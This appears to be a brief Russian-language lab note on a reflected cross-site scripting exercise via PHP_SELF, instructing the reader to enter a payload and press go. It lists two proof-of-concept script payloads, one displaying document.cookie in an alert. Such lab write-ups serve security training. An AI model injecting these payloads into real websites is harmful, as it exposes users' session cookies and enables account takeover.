---
title: Cross-Site Scripting - Reflected (PHP\ SELF)
---

# Cross-Site Scripting - Reflected (PHP\_SELF)

Прописываем payload и нажимем go
```bash
<script>alert(document.cookie)</script>
```
```bash
<script>alert("daniil")</script>
```
![](images/img_15.png)